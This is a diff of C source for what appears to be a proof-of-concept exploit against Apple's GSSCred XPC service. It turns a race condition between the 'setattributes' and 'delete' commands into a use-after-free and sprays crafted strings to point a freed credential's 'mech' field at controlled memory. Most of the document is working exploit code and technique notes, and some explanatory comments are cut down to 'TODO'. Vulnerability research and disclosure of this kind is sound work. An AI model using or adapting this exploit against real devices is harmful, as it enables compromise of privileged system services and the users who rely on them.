@@ -203,89 +203,37 @@
  *
  *  To unexpectedly change the program state while do_SetAttrs() is stalled we will use the
  *  do_Delete() function. This function is responsible for handling a "delete" command from the
- *  client. It will delete all credentials and all children of credentials matching the deletion
- *  query.
- *
- *  The code of this function is not that important but is presented here for completeness (again
- *  edited for presentation):
- *
- *  	static void
- *  	do_Delete(struct peer *peer, xpc_object_t request, xpc_object_t reply)
- *  	{
- *  		CFErrorRef error = NULL;
- *
- *  		CFArrayRef items = QueryCopy(peer, request, "query");	// (a) Credentials matching
- *  		if (items == NULL || CFArrayGetCount(items) == 0) {	//     the delete query are
- *  			const void *const keys[] =			//     copied to an array.
- *  				{ CFSTR("CommonErrorCode") };
- *  			const void *const values[] = { kCFBooleanTrue };
- *  			HCMakeError(&error,
- *  					kHeimCredErrorNoItemsMatchesQuery,
- *  					keys, values, 1);
- *  			goto out;
- *  		}
- *
- *  		CFIndex n, count = CFArrayGetCount(items);
- *  		for (n = 0; n < count; n++) {
- *  			HeimCredRef cred = (HeimCredRef)
- *  				CFArrayGetValueAtIndex(items, n);
- *  			heim_assert(CFGetTypeID(cred) == HeimCredGetTypeID(),
- *  					"cred wrong type");
- *
- *  			CFDictionaryRemoveValue(peer->session->items,
- *  					cred->uuid);
- *  			DeleteChildren(peer->session, cred->uuid);	// (b) Each child of a
- *  		}							//     matching credential
- *  									//     is deleted
- *  		notifyChangedCaches();					//     immediately.
- *  		HeimCredCTX.needFlush = 1;
- *
- *  	out:
- *  		if (error) {
- *  			addErrorToReply(reply, error);
- *  			CFRelease(error);
- *  		}
- *  		CFRELEASE_NULL(items);					// (c) The matching
- *  	}								//     credentials are
- *  									//     deleted.
- *
- *  The biggest thing to note about do_Delete() is that the child credentials are deleted first,
- *  then work is performed, then the parent credentials are deleted. This may or may not be an
- *  important factor, but in my limited testing the exploit seemed to run better when I deleted the
- *  target credential via its parent than when I deleted it directly.
+ *  client. It will delete all credentials matching the deletion query.
  *
  *  Using these two functions, the race condition flow goes like this:
  *
- *  1. Create all the credentials we'll need. One of these credentials will be the UAF target. The
- *     HeimCred structure is 40 (0x28) bytes, so they are allocated from the 0x30 freelist.
+ *  1. Create the credential we'll use for the UAF. The HeimCred structure is 40 (0x28) bytes, so
+ *     it is allocated from the 0x30 freelist.
  *
  *  2. Send the "setattributes" request for the target credential with an attributes dictionary
- *     that will take a long time to deserialize. A pointer to the target credential will be saved
- *     on the stack (or in a register) while HeimCredMessageCopyAttributes() is deserializing,
- *     allocating objects in a tight loop.
+ *     that will take a long time to deserialize. A pointer to the credential will be saved on the
+ *     stack (or in a register) while HeimCredMessageCopyAttributes() is deserializing, allocating
+ *     objects in a tight loop.
  *
- *     It turns out that in order to pass the validation check later, the only object type that
- *     HeimCredMessageCopyAttributes() can allocate in a loop is CFString objects. This is both
- *     good and bad: The good news is that, because CFString data is stored inline, we can force
- *     the CFString objects to be allocated from the 0x30 freelist. The bad news is that we can use
- *     only one null byte in the overwritten payload, and it has to be at or after offset 0x20.
+ *     It turns out that in order to pass the validation check later, the only way we can get
+ *     HeimCredMessageCopyAttributes() to allocate many objects from a loop is by passing an array
+ *     of strings in the kHEIMAttrBundleIdentifierACL property of the attributes dictionary. This
+ *     means that we're going to be dealing with XPC string objects and CFStrings. This is both
+ *     good and bad: The good news is that XPC string objects are also allocated from the 0x30
+ *     freelist. The bad news is that our payload string must be valid UTF-8 and will terminate at
+ *     the first null byte.
  *
  *     Some quick experiments on my 2015 MacBook Pro indicated that deserializing an attributes
  *     dictionary with an array of 26000 strings should take about 10 milliseconds, which seemed
  *     plenty of time to try and win the race.
  *
  *  3. Once it's likely that do_SetAttrs() is in the allocation loop, send the "delete" request to
- *     delete the target credential.
+ *     delete the target credential. The freed credential object will be added to the 0x30
+ *     freelist.
  *
- *     The delete request actually specifies the parent of the target credential, but due to how
- *     do_Delete() is implemented the children will be deleted first. Adding more children than
- *     just the target credential may help buffer against spurious allocations. In my testing,
- *     using 3 children seemed to work well.
- *
- *  4. Once the target credential is deleted, it will be added to the 0x30 freelist, and hopefully
- *     picked up by HeimCredMessageCopyAttributes() to become a CFString. Since we control the
- *     contents of the allocated CFString objects, we can overwrite some of the fields in the
- *     target HeimCred object.
+ *  4. If we're lucky, the freed credential object will be picked up by
+ *     HeimCredMessageCopyAttributes() in the first thread and be re-used as an XPC string object.
+ *     TODO
  *
  *  5. Eventually HeimCredMessageCopyAttributes() finishes and do_SetAttrs() resumes, not knowing
  *     that the contents of the credential pointer it stored have been changed. It passes the
@@ -310,31 +258,12 @@
  *  above but close to 4GB (0x100000000), with the exact address randomized by ASLR. Large
  *  VM_ALLOCATE objects might be placed at 0x0000000116097000: after the program, but still fairly
  *  close to 0x100000000. By comparison, the MALLOC_TINY heap (for small objects like those we're
- *  targeting) on macOS and iOS might start at 0x00007fb6f0400000. Thus, if we want to overwrite a
- *  field of the HeimCred structure with a pointer to controlled memory, it'll have to look like
- *  one of these. (There are exceptions for special-value pointers handled by Objective-C and
- *  CoreFoundation, but we'll ignore those for now.)
+ *  targeting) might start at 0x00007fb6f0400000 on macOS and 0x0000000107100000 on iOS. Thus, if
+ *  we want to overwrite a field of the HeimCred structure with a pointer to controlled memory,
+ *  it'll have to look like one of these. (There are exceptions for special-value pointers handled
+ *  by Objective-C and CoreFoundation, but we'll ignore those for now.)
  *
- *  Now let's take a look at how CFString works, to see what exactly we can overwrite. Here's a
- *  hypothetical structure for a short CFString object:
- *
- *  	struct CFString_short_s {
- *  		CFRuntimeBase runtime;		// 00: 0x10 bytes
- *  		uint8_t length;			// 10: 1 byte
- *  		char character_data[1];		// 11: variable size
- *  	};
- *
- *  The characters of a CFString are stored inline, after a CFRuntimeBase header and length field.
- *  Thus, we can control bytes 0x11 through 0x2f of the allocated CFString if we want to keep it in
- *  the 0x30 freelist. These bytes overlap with the three pointers stored in the HeimCred
- *  structure, which is perfect.
- *
- *  However, the only controlled data we have in the process is on the heap or in a VM_ALLOCATE
- *  region, and pointers to both types of regions contain null bytes. CFString, like most C-style
- *  strings, considers the null character as a terminator, and will stop copying into the inline
- *  character array after the first null byte. Thus, to stay in the 0x30 freelist, our first null
- *  byte must come at or after offset 0x20. This leaves just the "mech" field of the HeimCred
- *  structure as a possible exploit target.
+ *  TODO
  *
  *  Fortunately, because current macOS and iOS platforms are all little-endian, the pointer is laid
  *  out least significant byte to most significant byte. If we use an address like
@@ -342,9 +271,7 @@
  *  low 6 bytes of the address (including the null) will be copied into the "mech" field, leaving
  *  the remaining 2 (high) bytes of the pointer with whatever value they had originally.
  *
- *  As it turns out, this is completely sufficient for our needs. The "mech" field was originally a
- *  pointer to a heap object, and the first 2 (high) bytes of a heap pointer are 0. Thus, being
- *  able to copy only a single null byte still allows us to point "mech" to controlled data.
+ *  TODO
  *
  *  The first time the corrupted credential is used is in a call to
  *  handleDefaultCredentialUpdate(), which coincidentally uses the credential's "mech" field before
@@ -399,19 +326,25 @@ static const char *kHEIMObjectKerberos          = "kHEIMObjectKerberos";
 static const char *kHEIMAttrType                = "kHEIMAttrType";
 static const char *kHEIMTypeKerberos            = "kHEIMTypeKerberos";
 static const char *kHEIMAttrUUID                = "kHEIMAttrUUID";
-static const char *kHEIMAttrParentCredential    = "kHEIMAttrParentCredential";
 static const char *kHEIMAttrBundleIdentifierACL = "kHEIMAttrBundleIdentifierACL";
 
 // ---- Exploit parameters ------------------------------------------------------------------------
 
 static const char *GSSCRED_SERVICE_NAME = "com.apple.GSSCred";
 
-static const size_t CREDENTIAL_COUNT              = 4;
-static const size_t ACL_STRING_SIZE               = 31;		// malloc 48 freelist
-static const size_t ACL_STRING_COUNT              = 26000;	// 10 ms
-static const size_t SETATTRIBUTES_TO_DELETE_DELAY = 5000;	// 5 ms
-static const size_t POST_CREATE_CREDENTIALS_DELAY = 10000;	// 10 ms
-static const size_t RETRY_RACE_DELAY              = 100000;	// 100 ms
+static const size_t UAF_STRING_SIZE               = 0x30;
+static const size_t UAF_STRING_COUNT              = 26000;	// 10 ms
+static const size_t SETATTRIBUTES_TO_DELETE_DELAY = 6000;	// 6 ms
+static const size_t POST_CREATE_CREDENTIAL_DELAY  = 10000;	// 10 ms
+static const size_t RETRY_RACE_DELAY              = 300000;	// 300 ms
+
+// ---- Parameters for building the controlled page -----------------------------------------------
+
+static const uintptr_t DATA_ADDRESS       = 0x0000000120204000;
+
+// ---- Structure offsets -------------------------------------------------------------------------
+
+static const size_t OFFSET__HeimMech__name       = 0x10;
 
 // ---- Exploit implementation --------------------------------------------------------------------
 
@@ -421,8 +354,8 @@ struct gsscred_race_state {
 	xpc_connection_t setattributes_connection;
 	// The connection on which we will send the delete request.
 	xpc_connection_t delete_connection;
-	// An array of CREDENTIAL_COUNT create requests.
-	xpc_object_t *create_requests;
+	// The create request, which will create the credential.
+	xpc_object_t create_request;
 	// The setattributes request. The uuid parameter will need to be changed each attempt.
 	xpc_object_t setattributes_request;
 	// The delete request, which will delete all the children followed by the parent.
@@ -433,103 +366,69 @@ struct gsscred_race_state {
 	bool connection_interrupted;
 };
 
-// Fill the given buffer with the bundle ID of this application, if available. Otherwise the buffer
-// is not touched.
+// Generate the string that will be repeatedly deserialized and allocated by GSSCred.
+// TODO
 static void
-get_bundle_id(char *buffer, size_t size) {
-	CFDictionaryRef bundle_dict = CFBundleGetInfoDictionary(CFBundleGetMainBundle());
-	if (bundle_dict != NULL) {
-		CFStringRef bundle_id = CFDictionaryGetValue(bundle_dict,
-				CFSTR("CFBundleIdentifier"));
-		if (bundle_id != NULL) {
-			CFStringGetCString(bundle_id, buffer, size, kCFStringEncodingUTF8);
-		}
+gsscred_race_generate_uaf_string(char *uaf_string) {
+	for (size_t i = 0; i < UAF_STRING_SIZE / sizeof(uint64_t); i++) {
+		((uint64_t *)uaf_string)[i] = 0xa0c2410142042417;
 	}
+	uint8_t *mech = (uint8_t *)uaf_string;
+	uint8_t *name = mech + OFFSET__HeimMech__name;
+	// TODO
+	*(uint64_t *)name = DATA_ADDRESS + 0x20;
 }
 
 // Build the request objects for the GSSCred race. We do this all upfront.
 static void
 gsscred_race_build_requests(struct gsscred_race_state *state) {
-	state->create_requests = calloc(CREDENTIAL_COUNT, sizeof(*state->create_requests));
-	assert(state->create_requests != NULL);
+	uuid_t uuid  = { 0xab };
 
-	uuid_t child_uuid  = { 0xab };
-	uint16_t *child_uuid_16 = (uint16_t *) child_uuid;
-	uuid_t parent_uuid;
-	memcpy(parent_uuid, child_uuid, sizeof(parent_uuid));
-	size_t credential_index = 0;
-
-	// Build the create request for the parent credential:
+	// Build the create request for the credential:
 	// {
 	//     "command":    "create",
 	//     "attributes": {
 	//         "kHEIMObjectType": "kHEIMObjectKerberos",
 	//         "kHEIMAttrType":   "kHEIMTypeKerberos",
-	//         "kHEIMAttrUUID":   ab 0000,
+	//         "kHEIMAttrUUID":   ab,
 	//     },
 	// }
 	xpc_object_t create_attributes = xpc_dictionary_create(NULL, NULL, 0);
 	xpc_object_t create_request    = xpc_dictionary_create(NULL, NULL, 0);
 	xpc_dictionary_set_string(create_attributes, kHEIMObjectType, kHEIMObjectKerberos);
 	xpc_dictionary_set_string(create_attributes, kHEIMAttrType,   kHEIMTypeKerberos);
-	xpc_dictionary_set_uuid(  create_attributes, kHEIMAttrUUID,   parent_uuid);
+	xpc_dictionary_set_uuid(  create_attributes, kHEIMAttrUUID,   uuid);
 	xpc_dictionary_set_string(create_request, "command",    "create");
 	xpc_dictionary_set_value( create_request, "attributes", create_attributes);
 	xpc_release(create_attributes);
-	state->create_requests[credential_index] = create_request;
-	credential_index++;
+	state->create_request = create_request;
 
-	// Build the create request for the child credentials:
-	// {
-	//     "command":    "create",
-	//     "attributes": {
-	//         "kHEIMObjectType":           "kHEIMObjectKerberos",
-	//         "kHEIMAttrType":             "kHEIMTypeKerberos",
-	//         "kHEIMAttrUUID":             ab 0001,
-	//         "kHEIMAttrParentCredential": ab 0000,
-	//     },
-	// }
-	for (; credential_index < CREDENTIAL_COUNT; credential_index++) {
-		child_uuid_16[2] = (uint16_t) credential_index;
-		create_attributes = xpc_dictionary_create(NULL, NULL, 0);
-		create_request    = xpc_dictionary_create(NULL, NULL, 0);
-		xpc_dictionary_set_string(create_attributes, kHEIMObjectType,           kHEIMObjectKerberos);
-		xpc_dictionary_set_string(create_attributes, kHEIMAttrType,             kHEIMTypeKerberos);
-		xpc_dictionary_set_uuid(  create_attributes, kHEIMAttrUUID,             child_uuid);
-		xpc_dictionary_set_uuid(  create_attributes, kHEIMAttrParentCredential, parent_uuid);
-		xpc_dictionary_set_string(create_request, "command",    "create");
-		xpc_dictionary_set_value( create_request, "attributes", create_attributes);
-		xpc_release(create_attributes);
-		state->create_requests[credential_index] = create_request;
-	}
+	// Generate the string that will be deserialized repeatedly and be used in the UAF to point
+	// to our controlled data at DATA_ADDRESS.
+	char uaf_string[UAF_STRING_SIZE];
+	gsscred_race_generate_uaf_string(uaf_string);
 
-	// Build the setattributes request for the parent credential:
+	// Build the setattributes request for the target credential:
 	// {
 	//     "command":    "setattributes",
-	//     "uuid":       ???,       // chosen at request send time
+	//     "uuid":       ab,
 	//     "attributes": {
 	//         "kHEIMAttrBundleIdentifierACL": [
-	//             my bundle id,    // we don't want checkACLInCredentialChain() to take long
 	//             "AAAA...",
 	//             "AAAA...",
 	//             ...,
 	//         ],
 	//     },
 	// }
-	char bundle_id[512] = "*";
-	get_bundle_id(bundle_id, sizeof(bundle_id));
 	xpc_object_t new_acl               = xpc_array_create(NULL, 0);
 	xpc_object_t new_attributes        = xpc_dictionary_create(NULL, NULL, 0);
 	xpc_object_t setattributes_request = xpc_dictionary_create(NULL, NULL, 0);
-	xpc_array_set_string(new_acl, XPC_ARRAY_APPEND, bundle_id);
-	char acl_string[ACL_STRING_SIZE];
-	memset(acl_string, 'A', sizeof(acl_string));
-	acl_string[sizeof(acl_string) - 1] = 0;
-	for (size_t i = 0; i < ACL_STRING_COUNT; i++) {
-		xpc_array_set_string(new_acl, XPC_ARRAY_APPEND, acl_string);
+	for (size_t i = 0; i < UAF_STRING_COUNT; i++) {
+		xpc_array_set_string(new_acl, XPC_ARRAY_APPEND, uaf_string);
 	}
 	xpc_dictionary_set_value(new_attributes, kHEIMAttrBundleIdentifierACL, new_acl);
 	xpc_dictionary_set_string(setattributes_request, "command",    "setattributes");
+	xpc_dictionary_set_uuid(  setattributes_request, "uuid",       uuid);
 	xpc_dictionary_set_value( setattributes_request, "attributes", new_attributes);
 	xpc_release(new_acl);
 	xpc_release(new_attributes);
@@ -546,7 +445,7 @@ gsscred_race_build_requests(struct gsscred_race_state *state) {
 	xpc_object_t delete_query   = xpc_dictionary_create(NULL, NULL, 0);
 	xpc_object_t delete_request = xpc_dictionary_create(NULL, NULL, 0);
 	xpc_dictionary_set_string(delete_query, kHEIMAttrType, kHEIMTypeKerberos);
-	xpc_dictionary_set_uuid(  delete_query, kHEIMAttrUUID, parent_uuid);
+	xpc_dictionary_set_uuid(  delete_query, kHEIMAttrUUID, uuid);
 	xpc_dictionary_set_string(delete_request, "command", "delete");
 	xpc_dictionary_set_value( delete_request, "query",   delete_query);
 	xpc_release(delete_query);
@@ -564,14 +463,21 @@ gsscred_xpc_connect(xpc_handler_t handler) {
 	return connection;
 }
 
+// Check whether the given event indicates that the connection was interrupted, and if so, set the
+// interrupted flag.
+static void
+gsscred_race_check_interrupted(struct gsscred_race_state *state, xpc_object_t event) {
+	if (event == XPC_ERROR_CONNECTION_INTERRUPTED) {
+		state->connection_interrupted = true;
+	}
+}
+
 // Create all the GSSCred connections.
 static void
-gsscred_race_create_connections(struct gsscred_race_state *state) {
+gsscred_race_open_connections(struct gsscred_race_state *state) {
 	// Create the connection on which we will send the setattributes message.
 	state->setattributes_connection = gsscred_xpc_connect(^(xpc_object_t event) {
-		if (event == XPC_ERROR_CONNECTION_INTERRUPTED) {
-			state->connection_interrupted = true;
-		}
+		gsscred_race_check_interrupted(state, event);
 #if DEBUG_AT_LEVEL(3)
 		char *desc = xpc_copy_description(event);
 		DEBUG_TRACE("setattributes connection event: %s", desc);
@@ -581,94 +487,59 @@ gsscred_race_create_connections(struct gsscred_race_state *state) {
 
 	// Create the connection on which we will send the delete message.
 	state->delete_connection = gsscred_xpc_connect(^(xpc_object_t event) {
-		if (event == XPC_ERROR_CONNECTION_INTERRUPTED) {
-			state->connection_interrupted = true;
-		}
+		gsscred_race_check_interrupted(state, event);
 #if DEBUG_AT_LEVEL(3)
 		char *desc = xpc_copy_description(event);
 		DEBUG_TRACE("delete connection event: %s", desc);
 		free(desc);
 #endif
 	});
+
+	// Initialize state variables for the connections.
+	state->connection_interrupted = false;
+}
+
+// Close all the GSSCred connections.
+static void
+gsscred_race_close_connections(struct gsscred_race_state *state) {
+	xpc_connection_cancel(state->setattributes_connection);
+	xpc_connection_cancel(state->delete_connection);
+	xpc_release(state->setattributes_connection);
+	xpc_release(state->delete_connection);
 }
 
 // Initialize the state for exploiting the GSSCred race condition.
 static void
 gsscred_race_init(struct gsscred_race_state *state) {
 	gsscred_race_build_requests(state);
-	gsscred_race_create_connections(state);
+	gsscred_race_open_connections(state);
 	state->setattributes_reply_done = dispatch_semaphore_create(0);
-	state->connection_interrupted = false;
 }
 
 // Clean up all resources used by the GSSCred race state.
 static void
 gsscred_race_deinit(struct gsscred_race_state *state) {
-	xpc_release(state->setattributes_connection);
-	xpc_release(state->delete_connection);
-	for (size_t i = 0; i < CREDENTIAL_COUNT; i++) {
-		xpc_release(state->create_requests[i]);
-	}
-	free(state->create_requests);
+	gsscred_race_close_connections(state);
+	xpc_release(state->create_request);
 	xpc_release(state->setattributes_request);
 	xpc_release(state->delete_request);
 	dispatch_release(state->setattributes_reply_done);
 }
 
-// Send all the credential creation requests to GSSCred. We will do this on both connections in
-// parallel to prompt GSSCred to create the extra thread now, to avoid a potential thread creation
-// stall later when we send the delete request. (I haven't actually tested if this is necessary, it
-// just seemed like a good idea.)
+// Send the credential creation request to GSSCred.
 static bool
-gsscred_race_create_credentials_sync(struct gsscred_race_state *state) {
-	const size_t connection_count = 2;
-	xpc_connection_t connections[connection_count] = {
-		state->setattributes_connection, state->delete_connection
-	};
-	__block bool success = true;
-	dispatch_group_t group = dispatch_group_create();
-	dispatch_queue_t queue = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0);
-	for (size_t ci = 0; ci < connection_count; ci++) {
-		xpc_connection_t connection = connections[ci];
-		dispatch_group_async(group, queue, ^{
-			// Each dispatcher is responsible for handling one slice of the create
-			// requests on one connection.
-			for (size_t i = ci; i < CREDENTIAL_COUNT; i += connection_count) {
-				xpc_object_t reply = xpc_connection_send_message_with_reply_sync(
-					connection,
-					state->create_requests[i]);
+gsscred_race_create_credential_sync(struct gsscred_race_state *state) {
+	xpc_object_t reply = xpc_connection_send_message_with_reply_sync(
+			state->delete_connection,
+			state->create_request);
 #if DEBUG_AT_LEVEL(3)
-				char *desc = xpc_copy_description(reply);
-				DEBUG_TRACE("create reply %zu: %s", i, desc);
-				free(desc);
+	char *desc = xpc_copy_description(reply);
+	DEBUG_TRACE("create reply: %s", desc);
+	free(desc);
 #endif
-				bool failed = (xpc_dictionary_get_value(reply, "error") != NULL);
-				if (failed) {
-					success = false;
-					break;
-				}
-			}
-		});
-	}
-	dispatch_group_wait(group, DISPATCH_TIME_FOREVER);
-	dispatch_release(group);
+	bool success = (xpc_dictionary_get_value(reply, "error") == NULL);
+	xpc_release(reply);
 	return success;
-}
-
-// Choose a random target credential for the setattributes message. The only restriction is that it
-// can't be the parent credential, since we want the target to be deleted quickly.
-static void
-gsscred_race_choose_setattributes_target(struct gsscred_race_state *state) {
-	// First choose a random non-parent credential as the target UUID.
-	size_t target_index = (rand() % (CREDENTIAL_COUNT - 1)) + 1;
-	xpc_object_t create_request = state->create_requests[target_index];
-	assert(create_request != NULL);
-	xpc_object_t create_attributes = xpc_dictionary_get_value(create_request, "attributes");
-	assert(create_attributes != NULL);
-	const uint8_t *target_uuid = xpc_dictionary_get_uuid(create_attributes, kHEIMAttrUUID);
-	assert(target_uuid != NULL);
-	// Set the UUID in the setattributes message.
-	xpc_dictionary_set_uuid(state->setattributes_request, "uuid", target_uuid);
 }
 
 // Send the setattributes request asynchronously. This will cause do_SetAttrs() to stall in
@@ -676,16 +547,13 @@ gsscred_race_choose_setattributes_target(struct gsscred_race_state *state) {
 // continuously allocates CFString objects.
 static void
 gsscred_race_setattributes_async(struct gsscred_race_state *state) {
-	// First update the setattributes message to target a random child credential. This isn't
-	// so important with a small number of children, but when there are many credentials it
-	// helps ensure we aren't always stuck at one end of the child deallocation order.
-	gsscred_race_choose_setattributes_target(state);
 	// Send the setattributes message asynchronously.
 	xpc_connection_send_message_with_reply(
 			state->setattributes_connection,
 			state->setattributes_request,
 			NULL,
 			^(xpc_object_t reply) {
+		gsscred_race_check_interrupted(state, reply);
 		dispatch_semaphore_signal(state->setattributes_reply_done);
 #if DEBUG_AT_LEVEL(3)
 		// We never expect feedback.
@@ -699,21 +567,17 @@ gsscred_race_setattributes_async(struct gsscred_race_state *state) {
 	});
 }
 
-// Send the delete request synchronously. This will cause all the child credentials to be deleted
-// and hopefully allow the target credential to be reallocated as a CFString for setattributes.
+// Send the delete request synchronously. This will cause the target credential to be deleted
+// and hopefully allow it to be reallocated as a CFString for setattributes.
 static void
-gsscred_race_delete_credentials_sync(struct gsscred_race_state *state) {
+gsscred_race_delete_credential_sync(struct gsscred_race_state *state) {
 	xpc_object_t reply = xpc_connection_send_message_with_reply_sync(
 			state->delete_connection,
 			state->delete_request);
-	// We never expect feedback.
 #if DEBUG_AT_LEVEL(3)
 	char *desc = xpc_copy_description(reply);
 	DEBUG_TRACE("delete reply: %s", desc);
 	free(desc);
-#endif
-#if DEBUG
-	assert(xpc_dictionary_get_value(reply, "error") == NULL);
 #endif
 	xpc_release(reply);
 }
@@ -733,19 +597,24 @@ gsscred_race_run() {
 
 	gsscred_race_init(&state);
 
+	// First send a delete message to make sure GSSCred is up and running, then give it time to
+	// initialize.
+	gsscred_race_delete_credential_sync(&state);
+	sleep(1);
+
 	// Loop until we win.
 	const size_t MAX_TRIES = 4000;
 	for (size_t try = 1;; try++) {
-		// Create all the credentials synchronously.
-		bool ok = gsscred_race_create_credentials_sync(&state);
+		// Create the credential synchronously.
+		bool ok = gsscred_race_create_credential_sync(&state);
 		if (!ok) {
-			ERROR("Could not create the credentials");
+			ERROR("Could not create the credential");
 			break;
 		}
 
-		// Wait a little while after sending the credentials for GSSCred's allocator to
+		// Wait a little while after creating the credential for GSSCred's allocator to
 		// calm down. Probably not necessary, but better safe than sorry.
-		usleep(POST_CREATE_CREDENTIALS_DELAY);
+		usleep(POST_CREATE_CREDENTIAL_DELAY);
 
 		// Send the setattributes request asynchronously. do_SetAttrs() will store a
 		// pointer to the target credential on the stack and then loop continuously
@@ -758,7 +627,7 @@ gsscred_race_run() {
 		usleep(SETATTRIBUTES_TO_DELETE_DELAY);
 
 		// Send the delete message synchronously.
-		gsscred_race_delete_credentials_sync(&state);
+		gsscred_race_delete_credential_sync(&state);
 
 		// Wait for the setattributes request to finish.
 		gsscred_race_synchronize(&state);
